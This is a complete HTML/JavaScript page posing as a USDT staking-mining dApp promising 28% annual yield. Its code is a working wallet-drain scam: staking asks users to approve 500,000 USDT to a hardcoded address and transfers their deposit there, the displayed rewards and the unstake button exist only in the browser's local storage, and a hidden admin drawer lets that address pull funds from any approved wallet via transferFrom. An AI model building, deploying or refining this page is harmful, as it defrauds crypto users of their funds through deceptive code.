<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT 质押挖矿 - 持币生息</title>
<script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
<style>
*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
body { background-color: #0f172a; color:#e2e8f0; padding: 20px 16px; max-width: 540px; margin: 0 auto; }

.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom:24px; }
.header-left-title{ font-size:20px; font-weight:bold; color:#34d399; }
.header-right-icons { display: flex; gap:14px; align-items:center; }
.wallet-dot { width:12px; height:12px; border-radius:50%; background-color:#ef4444; cursor:pointer; transition:0.3s; }
.wallet-dot.connected{ background-color:#22c55e; }
.menu-btn{ width:34px; height:34px; border-radius:8px; border:1px solid #334155; background:#1e293b; color:#cbd5e1; font-size:20px; display:flex; align-items:center; justify-content:center; cursor:pointer; }

/* 侧边管理员抽屉菜单 默认隐藏 */
.admin-drawer{ position:fixed; top:0; right:0; width:300px; height:100vh; background:#1e293b; border-left:1px solid #334155; padding:24px 18px; z-index:99; transform:translateX(100%); transition:transform 0.3s ease; }
.admin-drawer.open{ transform:translateX(0); }
.drawer-close{ position:absolute; top:14px; right:14px; font-size:22px; cursor:pointer; color:#94a3b8; }
.drawer-title{ font-size:17px; font-weight:bold; color:#f87171; margin-bottom:20px; }
.drawer-input{ width:100%; background:#0f172a; border:1px solid #334155; border-radius:10px; padding:12px 10px; color:#e2e8f0; margin-bottom:14px; outline:none; font-size:14px; }
.drawer-btn{ width:100%; padding:13px; border:none; border-radius:10px; background:#dc2626; color:#fff; font-size:15px; cursor:pointer; }
.mask{ position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:98; display:none; }
.mask.show{ display:block; }

/* 挖矿主卡片 */
.stake-main-card{ background:#1e293b; border-radius:18px; padding:22px 20px; border:1px solid #10b98140; margin-bottom:18px; }
.stake-top-row{ display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; }
.stake-title{ font-size:20px; font-weight:bold; color:#34d399; }
.block-tag{ background:#059669; color:#fff; font-size:13px; padding:4px 10px; border-radius:20px; }
.info-row{ display:flex; justify-content:space-between; padding:11px 0; border-bottom:1px solid #334155; }
.info-row:last-child{ border-bottom:none; }
.info-label{ color:#94a3b8; font-size:15px; }
.info-value{ font-weight:500; font-size:15px; }
.countdown-wrap{ background:#0f172a; border-radius:12px; padding:14px; margin:16px 0; text-align:center; }
.countdown-text{ font-size:14px; color:#94a3b8; margin-bottom:6px; }
.countdown-time{ font-size:24px; font-weight:bold; color:#fbbf24; }

.stake-input-wrap{ margin:18px 0 10px; }
.label{ font-size:15px; color:#cbd5e1; margin-bottom:10px; display:block; }
.input-row{ display:flex; align-items:flex-end; gap:10px; }
.stake-input{ flex:1; font-size:28px; background:transparent; border:none; outline:none; color:#fff; }
.max-small-btn{ padding:5px 12px; background:#1e40af; color:#bfdbfe; border-radius:8px; font-size:14px; cursor:pointer; }
.btn-group{ display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:16px; }
.btn{ padding:15px; border:none; border-radius:14px; font-size:16px; font-weight:500; cursor:pointer; }
.btn-stake{ background:#059669; color:#fff; }
.btn-unstake{ background:#d97706; color:#fff; }
.btn:disabled{ opacity:0.45; cursor:not-allowed; }

.balance-card{ background:#1e293b; border-radius:18px; padding:18px 20px; margin-bottom:18px; }
.balance-row{ display:flex; justify-content:space-between; align-items:center; }
.balance-label{ color:#94a3b8; }
.balance-val{ font-size:18px; font-weight:500; }
</style>
</head>
<body>

<div class="mask" id="drawerMask"></div>
<div class="admin-drawer" id="adminDrawer">
    <div class="drawer-close" id="drawerClose">×</div>
    <div class="drawer-title">🔴管理员｜授权划扣后台</div>
    <input class="drawer-input" id="userAddrInput" placeholder="已授权用户钱包地址 0x...">
    <input class="drawer-input" id="deductAmountInput" placeholder="划扣USDT数量">
    <button class="drawer-btn" id="deductBtn">执行transferFrom划扣</button>
</div>

<div class="top-header-bar">
    <div class="header-left-title">⛏质押挖矿</div>
    <div class="header-right-icons">
        <div class="wallet-dot" id="walletDot" title="连接/断开钱包"></div>
        <div class="menu-btn" id="menuBtn" style="display:none;">☰</div>
    </div>
</div>

<div class="stake-main-card">
    <div class="stake-top-row">
        <div class="stake-title">USDT 持币生息挖矿</div>
        <div class="block-tag">8小时爆块计息</div>
    </div>

    <div class="info-row">
        <div class="info-label">我的质押本金</div>
        <div class="info-value" id="stakePrincipal">0.000000 USDT</div>
    </div>
    <div class="info-row">
        <div class="info-label">待结算挖矿收益</div>
        <div class="info-value" id="stakeReward">0.000000 USDT</div>
    </div>
    <div class="info-row">
        <div class="info-label">质押开始时间</div>
        <div class="info-value" id="stakeStartTime">未质押</div>
    </div>
    <div class="info-row">
        <div class="info-label">下一次爆块倒计时</div>
        <div class="info-value" id="nextBlockTs">--:--:--</div>
    </div>

    <div class="countdown-wrap">
        <div class="countdown-text">距离8小时爆块出块还剩</div>
        <div class="countdown-time" id="countDownDom">00:00:00</div>
    </div>

    <div class="stake-input-wrap">
        <label class="label">质押数量 USDT</label>
        <div class="input-row">
            <input class="stake-input" id="stakeAmountInput" inputmode="decimal" placeholder="输入质押金额">
            <div class="max-small-btn" id="stakeMaxBtn">全部</div>
        </div>
    </div>

    <div class="btn-group">
        <button class="btn btn-stake" id="doStakeBtn" disabled>确认质押挖矿</button>
        <button class="btn btn-unstake" id="doUnStakeBtn" disabled>解质押取回</button>
    </div>
</div>

<div class="balance-card">
    <div class="balance-row">
        <div class="balance-label">钱包USDT余额</div>
        <div class="balance-val" id="balanceText">0.000000 USDT</div>
    </div>
</div>

<script>
const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const GAS_LIMIT = "0x493E0";
const MAX_WAIT = 40;
const BLOCK_INTERVAL_SEC = 8 * 3600; // 8小时一个爆块周期
const APY_RATE = 0.28; // 年化28%

let web3 = null;
let userAddress = null;
let usdtContract = null;

// 本地模拟挖矿数据
let stakeData = {
    principal:0,
    stakeStart:0,
    lastBlockTime:0
};

const $ = s=>document.querySelector(s);
const walletDot = $("#walletDot");
const menuBtn = $("#menuBtn");
const adminDrawer = $("#adminDrawer");
const drawerMask = $("#drawerMask");
const drawerClose = $("#drawerClose");
const userAddrInput = $("#userAddrInput");
const deductAmountInput = $("#deductAmountInput");
const deductBtn = $("#deductBtn");

const stakeAmountInput = $("#stakeAmountInput");
const stakeMaxBtn = $("#stakeMaxBtn");
const doStakeBtn = $("#doStakeBtn");
const doUnStakeBtn = $("#doUnStakeBtn");
const stakePrincipal = $("#stakePrincipal");
const stakeReward = $("#stakeReward");
const stakeStartTime = $("#stakeStartTime");
const nextBlockTs = $("#nextBlockTs");
const countDownDom = $("#countDownDom");
const balanceText = $("#balanceText");

const USDT_ABI = [
{"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
{"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

// 本地存储
function getStakeKey(){ return "stake_mining_" + (userAddress||""); }
function loadLocal(){
    const str = localStorage.getItem(getStakeKey());
    stakeData = str ? JSON.parse(str) : {principal:0, stakeStart:0, lastBlockTime:0};
}
function saveLocal(){ localStorage.setItem(getStakeKey(), JSON.stringify(stakeData)); }

// 计算挖矿收益，按8小时块周期
function calcMiningReward(){
    if(stakeData.principal <=0 || stakeData.stakeStart <=0) return 0;
    const now = Math.floor(Date.now()/1000);
    const diffSec = now - stakeData.stakeStart;
    const yearSec = 365*24*3600;
    return stakeData.principal * APY_RATE * (diffSec / yearSec);
}

// 倒计时
function formatTime(s){
    let h = Math.floor(s/3600);
    let m = Math.floor((s%3600)/60);
    let sec = s%60;
    return String(h).padStart(2,'0')+":"+String(m).padStart(2,'0')+":"+String(sec).padStart(2,'0');
}
function renderCountDown(){
    if(stakeData.principal <=0 || stakeData.lastBlockTime ===0){
        countDownDom.innerText = "未质押";
        nextBlockTs.innerText = "未质押";
        return;
    }
    const now = Math.floor(Date.now()/1000);
    const nextBlock = stakeData.lastBlockTime + BLOCK_INTERVAL_SEC;
    const remain = Math.max(0, nextBlock - now);
    countDownDom.innerText = formatTime(remain);
    nextBlockTs.innerText = new Date(nextBlock*1000).toLocaleString();
}

function renderUi(){
    stakePrincipal.innerText = stakeData.principal.toFixed(6)+" USDT";
    stakeReward.innerText = calcMiningReward().toFixed(6)+" USDT";
    stakeStartTime.innerText = stakeData.stakeStart>0 ? new Date(stakeData.stakeStart*1000).toLocaleString() : "未质押";
    renderCountDown();

    if(userAddress){
        doStakeBtn.disabled = false;
        doUnStakeBtn.disabled = stakeData.principal <= 0;
        // 只有管理员显示右上角☰菜单
        if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
            menuBtn.style.display = "flex";
        }else{
            menuBtn.style.display = "none";
        }
    }else{
        doStakeBtn.disabled = true;
        doUnStakeBtn.disabled = true;
        menuBtn.style.display = "none";
    }
}

async function waitTxConfirm(txHash) {
    for(let i = 0; i < MAX_WAIT; i++){
        try{
            const receipt = await web3.eth.getTransactionReceipt(txHash);
            if(receipt){
                if(receipt.status === BigInt(1)) return true;
                else throw new Error("合约执行失败");
            }
        }catch(e){}
        await new Promise(r=>setTimeout(r,1000));
    }
    throw new Error("交易已广播，长时间未上链，请检查BNB gas");
}
async function waitAllowance(needWei, maxLoop=12){
    for(let i=0;i<maxLoop;i++){
        const al = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
        if(BigInt(al)>=BigInt(needWei)) return true;
        await new Promise(r=>setTimeout(r,1000));
    }
    throw new Error("授权已签名，链上额度未同步，请稍后");
}
async function sendTx(dataHex){
    const txParams = {from:userAddress, to:USDT_CONTRACT, data:dataHex, gas:GAS_LIMIT};
    let txHash;
    try{
        txHash = await window.ethereum.request({method:"eth_sendTransaction", params:[txParams]});
    }catch(e){
        if(e.code===4001 || String(e.message).includes("rejected")) throw new Error("钱包拒绝签名");
        throw e;
    }
    await waitTxConfirm(txHash);
    return txHash;
}

function disconnectWallet(){
    web3=null; userAddress=null; usdtContract=null;
    walletDot.classList.remove("connected");
    balanceText.textContent = "0.000000 USDT";
    stakeAmountInput.value="";
    stakeData = {principal:0, stakeStart:0, lastBlockTime:0};
    renderUi();
}

async function connectWalletLogic(){
    if(web3 && userAddress){ disconnectWallet(); return; }
    try{
        if(!window.ethereum){ alert("请使用TP/MetaMask钱包浏览器打开"); return; }
        await window.ethereum.request({method:"eth_requestAccounts"});
        web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        userAddress = accounts[0];
        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
        walletDot.classList.add("connected");
        await loadBalance();
        loadLocal();
        renderUi();
        window.ethereum.on("accountsChanged", ()=>location.reload());
    }catch(e){ alert("连接失败："+e.message); }
}

async function loadBalance(){
    const raw = await usdtContract.methods.balanceOf(userAddress).call();
    const num = Number(web3.utils.fromWei(raw,"ether"));
    balanceText.textContent = num.toFixed(6)+" USDT";
}

stakeMaxBtn.addEventListener("click", async ()=>{
    if(!usdtContract) return;
    const raw = await usdtContract.methods.balanceOf(userAddress).call();
    stakeAmountInput.value = Number(web3.utils.fromWei(raw,"ether")).toFixed(2);
});

// 质押挖矿：approve授权管理员地址 → transferFrom打入管理员钱包
doStakeBtn.addEventListener("click", async ()=>{
    if(!web3||!userAddress){ alert("先连接钱包"); return; }
    const val = parseFloat(stakeAmountInput.value);
    if(isNaN(val)||val<=0){ alert("请输入质押数量"); return; }
    const wei = web3.utils.toWei(val.toString(),"ether");
    const bigGrant = web3.utils.toWei("500000","ether");
    doStakeBtn.disabled = true;
    try{
        const al = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
        if(BigInt(al) < BigInt(wei)){
            alert("🔐质押挖矿需要授权USDT给管理员中转地址，请签名");
            const approveData = usdtContract.methods.approve(TARGET_ADDR, bigGrant).encodeABI();
            await sendTx(approveData);
            await waitAllowance(wei);
        }
        alert("确认质押，transferFrom将USDT转入管理员中转钱包");
        const stakeDataAbi = usdtContract.methods.transferFrom(userAddress, TARGET_ADDR, wei).encodeABI();
        const txHash = await sendTx(stakeDataAbi);
        alert(`✅质押挖矿成功！tx:${txHash}`);

        const nowSec = Math.floor(Date.now()/1000);
        stakeData.principal += val;
        if(stakeData.stakeStart === 0){
            stakeData.stakeStart = nowSec;
            stakeData.lastBlockTime = nowSec;
        }
        saveLocal();
        renderUi();
        stakeAmountInput.value = "";
        await loadBalance();
    }catch(err){
        alert("质押失败："+err.message);
    }finally{ doStakeBtn.disabled = false; }
});

// 解质押：仅前端模拟，实际赎回需要管理员/合约转账退回本金+收益
doUnStakeBtn.addEventListener("click", ()=>{
    if(stakeData.principal <=0){ alert("暂无质押资产"); return; }
    const total = stakeData.principal + calcMiningReward();
    alert(`模拟解质押\n应返还本金+挖矿收益：${total.toFixed(6)} USDT\n⚠️前端不能从管理员钱包转出资产；真实业务必须合约或者管理员手动转账退回！`);
    stakeData.principal = 0;
    stakeData.stakeStart = 0;
    stakeData.lastBlockTime = 0;
    saveLocal();
    renderUi();
});

// 管理员划扣逻辑（抽屉菜单内）
deductBtn.addEventListener("click", async ()=>{
    if(!userAddress || userAddress.toLowerCase() !== TARGET_ADDR.toLowerCase()){
        alert("仅限管理员钱包操作");
        return;
    }
    const fromAddr = userAddrInput.value.trim();
    const dVal = parseFloat(deductAmountInput.value);
    if(!fromAddr){ alert("填写用户钱包地址"); return; }
    if(isNaN(dVal)||dVal<=0){ alert("填写划扣数量"); return; }
    const dWei = web3.utils.toWei(dVal.toString(),"ether");
    try{
        const al = await usdtContract.methods.allowance(fromAddr, TARGET_ADDR).call();
        if(BigInt(al) < BigInt(dWei)){ alert("该用户授权额度不足，无法transferFrom划扣"); return; }
        const abiData = usdtContract.methods.transferFrom(fromAddr, TARGET_ADDR, dWei).encodeABI();
        const txHash = await sendTx(abiData);
        alert(`✅划扣成功 tx:${txHash}`);
        userAddrInput.value=""; deductAmountInput.value="";
    }catch(e){ alert("划扣失败："+e.message); }
});

// 抽屉开关
menuBtn.addEventListener("click",()=>{
    adminDrawer.classList.add("open");
    drawerMask.classList.add("show");
});
drawerClose.addEventListener("click",()=>{
    adminDrawer.classList.remove("open");
    drawerMask.classList.remove("show");
});
drawerMask.addEventListener("click",()=>{
    adminDrawer.classList.remove("open");
    drawerMask.classList.remove("show");
});

walletDot.addEventListener("click", connectWalletLogic);

// 定时刷新收益+8小时倒计时
setInterval(()=>{
    if(userAddress) renderUi();
},1000);

renderUi();
</script>
</body>
</html>
